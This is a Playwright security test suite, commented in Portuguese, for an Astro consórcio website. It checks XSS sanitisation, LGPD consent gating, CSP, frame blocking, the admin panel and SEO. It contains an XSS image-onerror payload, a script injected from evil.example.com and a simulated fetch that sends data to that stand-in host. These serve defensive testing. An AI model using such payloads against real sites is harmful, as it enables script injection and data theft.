// Bateria de testes da skill seguranca-em-sites para a versão Astro.
// Uso: node dev/testes-seguranca.js  (com o servidor-teste.js rodando nas portas 4400 = dist e 4401 = dist-teste)
const { chromium } = require('playwright');const fs=require('fs'),path=require('path');
const NM=process.env.NM, FONTS=process.env.FONTS;
const A='http://127.0.0.1:4400', X='http://127.0.0.1:4401';
const XSS='<img src=x onerror="window.__xss=1">';
const res=[];const ok=(n,c,d)=>res.push([c?'PASSOU':'FALHOU',n,d||'']);
(async()=>{const b=await chromium.launch({args:['--use-gl=swiftshader','--enable-webgl','--ignore-gpu-blocklist','--enable-unsafe-swiftshader']});
async function page(vp,mob){const ctx=await b.newContext({viewport:vp,isMobile:!!mob,hasTouch:!!mob});const p=await ctx.newPage();p.errs=[];
 p.on('pageerror',e=>p.errs.push('JS: '+e.message));p.on('console',m=>{if(m.type()==='error')p.errs.push(m.text().slice(0,160))});
 await p.route('**/three.min.js',r=>r.fulfill({body:fs.readFileSync(NM+'/three/build/three.min.js'),contentType:'application/javascript',headers:{'Access-Control-Allow-Origin':'*'}}));
 await p.route('https://fonts.googleapis.com/**',r=>r.fulfill({body:fs.readFileSync(FONTS,'utf8'),contentType:'text/css',headers:{'Access-Control-Allow-Origin':'*'}}));
 await p.route('https://fonts.gstatic.com/x/**',r=>{const f=path.join(NM,decodeURIComponent(new URL(r.request().url()).pathname.slice(3)));r.fulfill({body:fs.readFileSync(f),contentType:'font/woff2',headers:{'Access-Control-Allow-Origin':'*'}})});
 await p.route('https://evil.example.com/**',r=>r.fulfill({body:'window.__evil=1',contentType:'application/javascript',headers:{'Access-Control-Allow-Origin':'*'}}));
 await p.addInitScript(()=>{window.__csp=[];document.addEventListener('securitypolicyviolation',e=>window.__csp.push(e.blockedURI+' ('+e.violatedDirective+')'))});
 return p;}

/* 1. Teste do consórcio: nome e origem maliciosos + consentimento LGPD */
let p=await page({width:1280,height:800});
await p.goto(A+'/?origem='+encodeURIComponent(XSS));await p.waitForTimeout(1500);
await p.evaluate(()=>document.querySelector('[data-pick="imovel"]').click());await p.waitForTimeout(500);
for(const v of ['100a300','1a3','pouco']){await p.evaluate(v=>document.querySelector('.tq-opt[data-v="'+v+'"]').click(),v);await p.waitForTimeout(450);}
await p.fill('#tq-nome',XSS);await p.waitForTimeout(200);
let x=await p.evaluate(()=>({xss:window.__xss,img:document.querySelectorAll('#tq img').length,msg:decodeURIComponent(document.getElementById('wa-teste').href.split('?text=')[1])}));
ok('XSS: nome malicioso no teste não executa',x.xss===undefined&&x.img===0);
ok('XSS: origem maliciosa no link é limpa',!/[<>"'=]/.test(x.msg.split('\n').pop()),x.msg.split('\n').pop());
const before=await p.evaluate(()=>{const a=document.getElementById('wa-teste');const o=window.open;window.open=()=>{};const ev=new MouseEvent('click',{bubbles:true,cancelable:true});a.dispatchEvent(ev);window.open=o;return ev.defaultPrevented&&!document.getElementById('tq-ok-err').hidden});
ok('LGPD: sem marcar o consentimento, o envio é bloqueado',before);
await p.check('#tq-ok');
const after=await p.evaluate(()=>{const a=document.getElementById('wa-teste');a.addEventListener('click',e=>e.preventDefault(),{once:true});a.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true}));return document.getElementById('tq-ok-err').hidden&&a.getAttribute('aria-disabled')==='false'});
ok('LGPD: com o consentimento marcado, o envio é liberado',after);

/* 2. CSP: script de outro site e envio de dados para fora */
await p.goto(A+'/');await p.waitForTimeout(3000);
const csp=await p.evaluate(async()=>{const s=document.createElement('script');s.src='https://evil.example.com/x.js';document.head.appendChild(s);
 let fetchBlocked=false;try{await fetch('https://evil.example.com/coleta?dados=1')}catch(e){fetchBlocked=true}
 await new Promise(r=>setTimeout(r,800));return {evil:window.__evil,fetchBlocked,csp:window.__csp}});
ok('CSP: script de outro site é bloqueado',csp.evil===undefined&&csp.csp.some(v=>v.includes('evil')&&v.includes('script-src')));
ok('CSP: envio de dados para fora é bloqueado',csp.fetchBlocked&&csp.csp.some(v=>v.includes('connect-src')));
ok('CSP: animação 3D (CDN autorizada, com SRI) continua carregando',await p.evaluate(()=>!!document.querySelector('#animacao-3d canvas')));
ok('Sem violações de CSP nos recursos do próprio site',!csp.csp.some(v=>!v.includes('evil')),csp.csp.filter(v=>!v.includes('evil')).join(', '));
p.errs=p.errs.filter(e=>!e.includes('evil.example'));ok('Sem erros no console (início, fora os ataques simulados)',p.errs.length===0,p.errs.join(' | '));
await p.context().close();

/* 3. Artigo malicioso publicado (título, resumo, FAQ e corpo com HTML) */
p=await page({width:1280,height:900});
for(const u of ['/blog/','/blog/zz-teste-xss/','/']){await p.goto(X+u);await p.waitForTimeout(900);}
x=await p.evaluate(()=>({xss:window.__xss}));
await p.goto(X+'/blog/zz-teste-xss/');await p.waitForTimeout(900);
const x2=await p.evaluate(()=>({xss:window.__xss,titulo:document.querySelector('h1').textContent.includes('<img'),csp:window.__csp}));
ok('XSS: artigo com código malicioso não executa nada',x.xss===undefined&&x2.xss===undefined,'bloqueios CSP: '+x2.csp.length);
ok('XSS: título malicioso aparece como texto',x2.titulo);
await p.context().close();

/* 4. Site e painel dentro de iframe de outro site */
p=await page({width:1280,height:950});
const fr=await b.newContext();const pf=await fr.newPage();
await pf.route('http://outro-site.test/**',r=>r.fulfill({body:fs.readFileSync(__dirname+'/moldura.html'),contentType:'text/html'}));
await pf.goto('http://outro-site.test/');await pf.waitForTimeout(2500);
const carregou=await Promise.all(pf.frames().slice(1).map(f=>f.evaluate(()=>document.body&&document.body.innerHTML.length>50).catch(()=>false)));
ok('Iframe: site e painel não abrem dentro de outro site (X-Frame-Options DENY)',carregou.length===2&&carregou.every(v=>!v),JSON.stringify(carregou));
await fr.close();await p.context().close();

/* 5. Painel /admin/ */
p=await page({width:1280,height:900});
const resp=await p.goto(A+'/admin/');await p.waitForTimeout(6000);
const hd=resp.headers();
const adm=await p.evaluate(()=>({txt:document.body.innerText.slice(0,400),btn:[...document.querySelectorAll('button')].map(b=>b.textContent.trim()),csp:window.__csp}));
ok('Painel: abre a tela de login com GitHub',adm.btn.some(t=>/GitHub/i.test(t)),adm.btn.join(' / '));
ok('Painel: tem CSP própria, noindex e sem cache',!!hd['content-security-policy']&&/noindex/.test(hd['x-robots-tag']||'')&&/no-store/.test(hd['cache-control']||''));
ok('Painel: sem violações de CSP',adm.csp.length===0,adm.csp.join(', '));
ok('Painel: sem erros no console',p.errs.filter(e=>!/favicon/.test(e)).length===0,p.errs.join(' | ').slice(0,300));
const cfg=await (await p.request.get(A+'/admin/config.yml')).text();
ok('Painel: usa login do GitHub via Netlify (sem senha guardada no site)',/name: github/.test(cfg)&&/api\.netlify\.com/.test(cfg)&&!/password|token/i.test(cfg));
await p.context().close();

/* 6. Telas, links e SEO */
const pages=['/','/blog/','/blog/como-funciona-o-lance-no-consorcio/','/blog/consorcio-ou-financiamento/','/blog/fgts-no-consorcio-de-imovel/','/sobre/','/contato/','/privacidade/','/termos/'];
for(const w of [1280,390,360,320]){p=await page({width:w,height:800},w<800);let bad=[];
 for(const u of pages){await p.goto(A+u);await p.waitForTimeout(w===1280&&u==='/'?2500:500);const o=await p.evaluate(()=>document.documentElement.scrollWidth-innerWidth);if(o>1)bad.push(u+' +'+o+'px')}
 if(w===390)await p.screenshot({path:process.env.SHOTS+'/astro-390.png'});
 ok('Tela '+w+'px sem rolagem lateral',bad.length===0,bad.join(', '));
 ok('Tela '+w+'px sem erros no console',p.errs.length===0,p.errs.slice(0,3).join(' | '));
 if(w===1280){await p.goto(A+'/');await p.waitForTimeout(2500);await p.screenshot({path:process.env.SHOTS+'/astro-1280.png'});
  await p.goto(A+'/blog/como-funciona-o-lance-no-consorcio/');await p.waitForTimeout(600);await p.screenshot({path:process.env.SHOTS+'/astro-post.png',fullPage:false});}
 await p.context().close();}
p=await page({width:1280,height:800});const links=new Set();
for(const u of pages){await p.goto(A+u);(await p.evaluate(()=>[...document.querySelectorAll('a[href^="/"]')].map(a=>a.getAttribute('href').split('#')[0].split('?')[0]))).forEach(l=>links.add(l||'/'))}
const quebrados=[];for(const l of links){const r=await p.request.get(A+l);if(r.status()!==200)quebrados.push(l+' '+r.status())}
ok('Links internos sem erro ('+links.size+' links)',quebrados.length===0,quebrados.join(', '));
const sm=await (await p.request.get(A+'/sitemap-0.xml')).text();
ok('Sitemap com as páginas e sem o painel',(sm.match(/<loc>/g)||[]).length>=9&&!sm.includes('/admin'));
const rb=await (await p.request.get(A+'/robots.txt')).text();ok('robots.txt bloqueia /admin/ e aponta o sitemap',/Disallow: \/admin\//.test(rb)&&/Sitemap: http/.test(rb));
const rascunho=await p.request.get(A+'/blog/parcela-atrasada-no-consorcio/');ok('Rascunho não fica público',rascunho.status()===404);
const post=await p.evaluate(async()=>{});await p.goto(A+'/blog/como-funciona-o-lance-no-consorcio/');
const seo=await p.evaluate(()=>({t:document.title.length,d:document.querySelector('meta[name=description]').content.length,can:!!document.querySelector('link[rel=canonical]'),ld:[...document.querySelectorAll('script[type="application/ld+json"]')].map(s=>JSON.parse(s.textContent)).flat().map(o=>o['@type'])}));
ok('Artigo com título, descrição, canonical e dados estruturados',seo.d<=160&&seo.can&&seo.ld.includes('BlogPosting')&&seo.ld.includes('FAQPage'),JSON.stringify(seo));
await b.close();
for(const r of res)console.log(r[0]+'  '+r[1]+(r[2]&&r[0]==='FALHOU'||r[2]&&/bloqueios/.test(r[1]+r[2])?'  ['+r[2]+']':''));
console.log('\n'+res.filter(r=>r[0]==='PASSOU').length+'/'+res.length+' passaram');})();
